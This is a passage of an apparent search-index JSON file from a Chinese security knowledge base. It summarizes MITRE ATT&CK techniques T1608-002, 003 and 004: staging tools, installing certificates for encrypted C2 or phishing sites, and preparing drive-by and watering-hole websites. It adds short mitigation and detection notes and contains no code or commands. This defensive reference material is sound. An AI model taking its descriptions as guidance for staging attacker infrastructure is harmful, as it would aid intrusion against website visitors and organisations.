repo\uff09\u4e0b\u8f7d\u5de5\u5177\uff0c\u5305\u62ec\u5de5\u5177\u7684\u539f\u59cb\u6258\u7ba1\u7f51\u7ad9\uff0c\u6765\u907f\u514d\u4e0a\u4f20\u5de5\u5177\u7684\u9700\u8981\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_1","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u68c0\u6d4b\u8fd9\u79cd\u884c\u4e3a\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u540e\u6e17\u900f\u9636\u6bb5\uff0c\u5982\u5165\u4fb5\u5de5\u5177\u8f6c\u79fb\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_9","text":"MITRE-ATT&CK-T1608-002 https://attack.mitre.org/techniques/T1608/002/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/","text":"T1608-003-\u9636\u6bb5\u6027\u80fd\u529b-\u5b89\u88c5\u6570\u5b57\u8bc1\u4e66 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5b89\u88c5SSL/TLS\u8bc1\u4e66\uff0c\u5728\u653b\u51fb\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u4f7f\u7528\u3002SSL/TLS\u8bc1\u4e66\u662f\u53ef\u4ee5\u5b89\u88c5\u5728\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\uff0c\u4ee5\u5b9e\u73b0\u7cfb\u7edf\u4e4b\u95f4\u7684\u5b89\u5168\u901a\u4fe1\u3002\u6570\u5b57\u8bc1\u4e66\u5305\u62ec\u5173\u4e8e\u5bc6\u94a5\u7684\u4fe1\u606f\uff0c\u5173\u4e8e\u5176\u6240\u6709\u8005\u8eab\u4efd\u7684\u4fe1\u606f\uff0c\u4ee5\u53ca\u4e00\u4e2a\u5b9e\u4f53\u7684\u6570\u5b57\u7b7e\u540d\uff0c\u8be5\u5b9e\u4f53\u5df2\u7ecf\u9a8c\u8bc1\u4e86\u8bc1\u4e66\u7684\u5185\u5bb9\u662f\u6b63\u786e\u7684\u3002\u5982\u679c\u7b7e\u540d\u662f\u6709\u6548\u7684\uff0c\u5e76\u4e14\u68c0\u67e5\u8bc1\u4e66\u7684\u4eba\u4fe1\u4efb\u7b7e\u540d\u8005\uff0c\u90a3\u4e48\u4ed6\u4eec\u77e5\u9053\u4ed6\u4eec\u53ef\u4ee5\u4f7f\u7528\u8be5\u94a5\u5319\u4e0e\u5b83\u7684\u6240\u6709\u8005\u8fdb\u884c\u5b89\u5168\u901a\u4fe1\u3002\u8bc1\u4e66\u53ef\u4ee5\u88ab\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u4e0a\uff0c\u7136\u540e\u670d\u52a1\u5668\u53ef\u4ee5\u88ab\u914d\u7f6e\u4e3a\u4f7f\u7528\u8bc1\u4e66\u6765\u5b9e\u73b0\u4e0e\u5b83\u7684\u52a0\u5bc6\u901a\u4fe1\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5b89\u88c5SSL/TLS\u8bc1\u4e66\uff0c\u7528\u6765\u63a8\u8fdb\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u5982\u52a0\u5bc6C2\u6d41\u91cf\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u534f\u8bae\u7684\u975e\u5bf9\u79f0\u52a0\u5bc6\u6cd5\uff09\uff0c\u6216\u5c06\u53ef\u4fe1\u5ea6\u501f\u7ed9\u8bc1\u4e66\u91c7\u96c6\u7f51\u7ad9\u3002\u6570\u5b57\u8bc1\u4e66\u7684\u5b89\u88c5\u53ef\u80fd\u53d1\u751f\u5728\u4e00\u4e9b\u670d\u52a1\u5668\u7c7b\u578b\u4e0a\uff0c\u5305\u62ec\u7f51\u7edc\u670d\u52a1\u5668\u548c\u7535\u5b50\u90ae\u4ef6\u670d\u52a1\u5668\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u5f97\u6570\u5b57\u8bc1\u4e66\u6216\u521b\u5efa\u81ea\u7b7e\u540d\u7684\u8bc1\u4e66\u3002\u7136\u540e\uff0c\u6570\u5b57\u8bc1\u4e66\u53ef\u4ee5\u88ab\u5b89\u88c5\u5728\u653b\u51fb\u8005\u63a7\u5236\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\uff0c\u8fd9\u4e9b\u57fa\u7840\u8bbe\u65bd\u53ef\u80fd\u662f\u5df2\u7ecf\u83b7\u5f97\u7684\uff08\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd\uff09\u6216\u4ee5\u524d\u88ab\u7834\u574f\u7684\uff08\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8003\u8651\u4f7f\u7528\u53ef\u80fd\u6709\u52a9\u4e8e\u8ddf\u8e2a\u6574\u4e2a\u4e92\u8054\u7f51\u4e0a\u7684\u7f51\u7ad9\u6240\u4f7f\u7528\u7684\u8bc1\u4e66\u7684\u670d\u52a1\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6709\u53ef\u80fd\u4ee5\u5df2\u77e5\u7684\u8bc1\u4e66\u4fe1\u606f\u4e3a\u652f\u70b9\uff0c\u53d1\u73b0\u5176\u4ed6\u653b\u51fb\u8005\u7684\u57fa\u7840\u8bbe\u65bd\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u4ee5\u96c6\u4e2d\u5728\u76f8\u5173\u884c\u4e3a\u4e0a\uff0c\u5982\u7f51\u7edc\u534f\u8bae\u6216\u975e\u5bf9\u79f0\u5bc6\u7801\u5b66\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1608-003 https://attack.mitre.org/techniques/T1608/003/","title":"T1608-003-\u9636\u6bb5\u6027\u80fd\u529b-\u5b89\u88c5\u6570\u5b57\u8bc1\u4e66"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#t1608-003-","text":"","title":"T1608-003-\u9636\u6bb5\u6027\u80fd\u529b-\u5b89\u88c5\u6570\u5b57\u8bc1\u4e66"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5b89\u88c5SSL/TLS\u8bc1\u4e66\uff0c\u5728\u653b\u51fb\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u4f7f\u7528\u3002SSL/TLS\u8bc1\u4e66\u662f\u53ef\u4ee5\u5b89\u88c5\u5728\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\uff0c\u4ee5\u5b9e\u73b0\u7cfb\u7edf\u4e4b\u95f4\u7684\u5b89\u5168\u901a\u4fe1\u3002\u6570\u5b57\u8bc1\u4e66\u5305\u62ec\u5173\u4e8e\u5bc6\u94a5\u7684\u4fe1\u606f\uff0c\u5173\u4e8e\u5176\u6240\u6709\u8005\u8eab\u4efd\u7684\u4fe1\u606f\uff0c\u4ee5\u53ca\u4e00\u4e2a\u5b9e\u4f53\u7684\u6570\u5b57\u7b7e\u540d\uff0c\u8be5\u5b9e\u4f53\u5df2\u7ecf\u9a8c\u8bc1\u4e86\u8bc1\u4e66\u7684\u5185\u5bb9\u662f\u6b63\u786e\u7684\u3002\u5982\u679c\u7b7e\u540d\u662f\u6709\u6548\u7684\uff0c\u5e76\u4e14\u68c0\u67e5\u8bc1\u4e66\u7684\u4eba\u4fe1\u4efb\u7b7e\u540d\u8005\uff0c\u90a3\u4e48\u4ed6\u4eec\u77e5\u9053\u4ed6\u4eec\u53ef\u4ee5\u4f7f\u7528\u8be5\u94a5\u5319\u4e0e\u5b83\u7684\u6240\u6709\u8005\u8fdb\u884c\u5b89\u5168\u901a\u4fe1\u3002\u8bc1\u4e66\u53ef\u4ee5\u88ab\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u4e0a\uff0c\u7136\u540e\u670d\u52a1\u5668\u53ef\u4ee5\u88ab\u914d\u7f6e\u4e3a\u4f7f\u7528\u8bc1\u4e66\u6765\u5b9e\u73b0\u4e0e\u5b83\u7684\u52a0\u5bc6\u901a\u4fe1\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5b89\u88c5SSL/TLS\u8bc1\u4e66\uff0c\u7528\u6765\u63a8\u8fdb\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u5982\u52a0\u5bc6C2\u6d41\u91cf\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u534f\u8bae\u7684\u975e\u5bf9\u79f0\u52a0\u5bc6\u6cd5\uff09\uff0c\u6216\u5c06\u53ef\u4fe1\u5ea6\u501f\u7ed9\u8bc1\u4e66\u91c7\u96c6\u7f51\u7ad9\u3002\u6570\u5b57\u8bc1\u4e66\u7684\u5b89\u88c5\u53ef\u80fd\u53d1\u751f\u5728\u4e00\u4e9b\u670d\u52a1\u5668\u7c7b\u578b\u4e0a\uff0c\u5305\u62ec\u7f51\u7edc\u670d\u52a1\u5668\u548c\u7535\u5b50\u90ae\u4ef6\u670d\u52a1\u5668\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u5f97\u6570\u5b57\u8bc1\u4e66\u6216\u521b\u5efa\u81ea\u7b7e\u540d\u7684\u8bc1\u4e66\u3002\u7136\u540e\uff0c\u6570\u5b57\u8bc1\u4e66\u53ef\u4ee5\u88ab\u5b89\u88c5\u5728\u653b\u51fb\u8005\u63a7\u5236\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\uff0c\u8fd9\u4e9b\u57fa\u7840\u8bbe\u65bd\u53ef\u80fd\u662f\u5df2\u7ecf\u83b7\u5f97\u7684\uff08\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd\uff09\u6216\u4ee5\u524d\u88ab\u7834\u574f\u7684\uff08\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_1","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_8","text":"\u8003\u8651\u4f7f\u7528\u53ef\u80fd\u6709\u52a9\u4e8e\u8ddf\u8e2a\u6574\u4e2a\u4e92\u8054\u7f51\u4e0a\u7684\u7f51\u7ad9\u6240\u4f7f\u7528\u7684\u8bc1\u4e66\u7684\u670d\u52a1\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6709\u53ef\u80fd\u4ee5\u5df2\u77e5\u7684\u8bc1\u4e66\u4fe1\u606f\u4e3a\u652f\u70b9\uff0c\u53d1\u73b0\u5176\u4ed6\u653b\u51fb\u8005\u7684\u57fa\u7840\u8bbe\u65bd\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u4ee5\u96c6\u4e2d\u5728\u76f8\u5173\u884c\u4e3a\u4e0a\uff0c\u5982\u7f51\u7edc\u534f\u8bae\u6216\u975e\u5bf9\u79f0\u5bc6\u7801\u5b66\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_9","text":"MITRE-ATT&CK-T1608-003 https://attack.mitre.org/techniques/T1608/003/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/","text":"T1608-004-\u9636\u6bb5\u6027\u80fd\u529b-Drive-by Target \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u51c6\u5907\u4e00\u4e2a\u64cd\u4f5c\u73af\u5883\u6765\u611f\u67d3\u5728\u6b63\u5e38\u6d4f\u89c8\u8fc7\u7a0b\u4e2d\u8bbf\u95ee\u7f51\u7ad9\u7684\u7cfb\u7edf\u3002\u7aef\u70b9\u7cfb\u7edf\u53ef\u80fd\u901a\u8fc7\u6d4f\u89c8\u653b\u51fb\u8005\u63a7\u5236\u7684\u7f51\u7ad9\u800c\u88ab\u5165\u4fb5\uff0c\u5c31\u50cfDrive-by Compromise\u4e2d\u7684\u60c5\u51b5\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u7528\u6237\u7684\u7f51\u7edc\u6d4f\u89c8\u5668\u901a\u5e38\u662f\u5229\u7528\u7684\u76ee\u6807\uff08\u4e00\u65e6\u767b\u9646\u7f51\u7ad9\uff0c\u901a\u5e38\u4e0d\u9700\u8981\u4efb\u4f55\u989d\u5916\u7684\u7528\u6237\u4e92\u52a8\uff09\uff0c\u4f46\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u4e3a\u975e\u5229\u7528\u884c\u4e3a\uff08\u5982\u5e94\u7528\u8bbf\u95ee\u6807\u8bb0\uff09\u8bbe\u7f6e\u7f51\u7ad9\u3002\u5728\u8fdb\u884c\u201c\u5077\u6e21\u5f0f\u201d\u7834\u574f\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u51c6\u5907\u597d\u5fc5\u8981\u7684\u8d44\u6e90\uff0c\u4ee5\u4fbf\u5411\u6d4f\u89c8\u5230\u653b\u51fb\u8005\u63a7\u5236\u7684\u7f51\u7ad9\u7684\u7528\u6237\u63d0\u4f9b\u8fd9\u79cd\u5229\u7528\u3002\u5077\u6e21\u5185\u5bb9\u53ef\u4ee5\u5728\u653b\u51fb\u8005\u63a7\u5236\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\u4e0a\u6f14\uff0c\u8fd9\u4e9b\u57fa\u7840\u8bbe\u65bd\u5df2\u7ecf\u83b7\u5f97\uff08\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd\uff09\u6216\u4ee5\u524d\u88ab\u7834\u574f\uff08\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd\uff09\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e0a\u4f20\u6216\u6ce8\u5165\u6076\u610f\u7684\u7f51\u7edc\u5185\u5bb9\uff0c\u5982JavaScript\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u5b9e\u73b0\uff0c\u5305\u62ec\u5c06\u6076\u610f\u811a\u672c\u63d2\u5165\u7f51\u9875\u6216\u5176\u4ed6\u7528\u6237\u53ef\u63a7\u5236\u7684\u7f51\u7edc\u5185\u5bb9\uff0c\u5982\u8bba\u575b\u5e16\u5b50\u3002\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u5236\u4f5c\u6076\u610f\u7684\u7f51\u7edc\u5e7f\u544a\uff0c\u5e76\u901a\u8fc7\u5408\u6cd5\u7684\u5e7f\u544a\u4f9b\u5e94\u5546\u8d2d\u4e70\u7f51\u7ad9\u4e0a\u7684\u5e7f\u544a\u7a7a\u95f4\u3002\u9664\u4e86\u653e\u7f6e\u5185\u5bb9\u4ee5\u5229\u7528\u7528\u6237\u7684\u7f51\u7edc\u6d4f\u89c8\u5668\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u653e\u7f6e\u811a\u672c\u5185\u5bb9\u6765\u63cf\u8ff0\u7528\u6237\u7684\u6d4f\u89c8\u5668\uff08\u5982\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f\uff09\uff0c\u4ee5\u786e\u4fdd\u5176\u5728\u5c1d\u8bd5\u5229\u7528\u524d\u662f\u8106\u5f31\u7684\u3002 \u88ab\u653b\u51fb\u8005\u653b\u7834\u5e76\u7528\u4e8e\u5b9e\u65bd\u5077\u6e21\u7684\u7f51\u7ad9\u53ef\u80fd\u662f\u7279\u5b9a\u7fa4\u4f53\u8bbf\u95ee\u7684\u7f51\u7ad9\uff0c\u5982\u653f\u5e9c\u3001\u7279\u5b9a\u884c\u4e1a\u6216\u5730\u533a\uff0c\u5176\u76ee\u7684\u662f\u57fa\u4e8e\u5171\u540c\u7684\u5174\u8da3\uff0c\u653b\u7834\u7279\u5b9a\u7528\u6237\u6216\u4e00\u7ec4\u7528\u6237\u3002\u8fd9\u79cd\u6709\u9488\u5bf9\u6027\u7684\u653b\u51fb\u88ab\u79f0\u4e3a\u6218\u7565\u7f51\u7edc\u653b\u51fb\u6216\u6c34\u5751\u653b\u51fb\u3002 \u653b\u51fb\u8005\u5728\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\uff08\u57df\u540d\uff09\u7684\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u80fd\u4f1a\u8d2d\u4e70\u4e0e\u5408\u6cd5\u57df\u540d\u7c7b\u4f3c\u7684\u57df\u540d\uff08\u4f8b\u5982\uff1a\u540c\u97f3\u5b57\u3001\u9519\u522b\u5b57\u3001\u4e0d\u540c\u7684\u9876\u7ea7\u57df\u540d\u7b49\uff09\uff0c\u4ee5\u5e2e\u52a9\u4fc3\u8fdb\u5077\u6e21\u5f0f\u7834\u574f\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u7684\u5927\u90e8\u5206\u5c06\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c1\u6027\u4e4b\u5916\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u5176\u4ed6\u9636\u6bb5\uff0c\u4f8b\u5982\u901a\u8fc7\u59a5\u534f\u6216\u5229\u7528\u5ba2\u6237\u7aef\u6267\u884c\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1608-004 https://attack.mitre.org/techniques/T1608/004/","title":"T1608-004-\u9636\u6bb5\u6027\u80fd\u529b-Drive-by Target"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#t1608-004-drive-by-target","text":"","title":"T1608-004-\u9636\u6bb5\u6027\u80fd\u529b-Drive-by Target"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u51c6\u5907\u4e00\u4e2a\u64cd\u4f5c\u73af\u5883\u6765\u611f\u67d3\u5728\u6b63\u5e38\u6d4f\u89c8\u8fc7\u7a0b\u4e2d\u8bbf\u95ee\u7f51\u7ad9\u7684\u7cfb\u7edf\u3002\u7aef\u70b9\u7cfb\u7edf\u53ef\u80fd\u901a\u8fc7\u6d4f\u89c8\u653b\u51fb\u8005\u63a7\u5236\u7684\u7f51\u7ad9\u800c\u88ab\u5165\u4fb5\uff0c\u5c31\u50cfDrive-by Compromise\u4e2d\u7684\u60c5\u51b5\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u7528\u6237\u7684\u7f51\u7edc\u6d4f\u89c8\u5668\u901a\u5e38\u662f\u5229\u7528\u7684\u76ee\u6807\uff08\u4e00\u65e6\u767b\u9646\u7f51\u7ad9\uff0c\u901a\u5e38\u4e0d\u9700\u8981\u4efb\u4f55\u989d\u5916\u7684\u7528\u6237\u4e92\u52a8\uff09\uff0c\u4f46\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u4e3a\u975e\u5229\u7528\u884c\u4e3a\uff08\u5982\u5e94\u7528\u8bbf\u95ee\u6807\u8bb0\uff09\u8bbe\u7f6e\u7f51\u7ad9\u3002\u5728\u8fdb\u884c\u201c\u5077\u6e21\u5f0f\u201d\u7834\u574f\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u51c6\u5907\u597d\u5fc5\u8981\u7684\u8d44\u6e90\uff0c\u4ee5\u4fbf\u5411\u6d4f\u89c8\u5230\u653b\u51fb\u8005\u63a7\u5236\u7684\u7f51\u7ad9\u7684\u7528\u6237\u63d0\u4f9b\u8fd9\u79cd\u5229\u7528\u3002\u5077\u6e21\u5185\u5bb9\u53ef\u4ee5\u5728\u653b\u51fb\u8005\u63a7\u5236\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\u4e0a\u6f14\uff0c\u8fd9\u4e9b\u57fa\u7840\u8bbe\u65bd\u5df2\u7ecf\u83b7\u5f97\uff08\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd\uff09\u6216\u4ee5\u524d\u88ab\u7834\u574f\uff08\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd\uff09\u3002 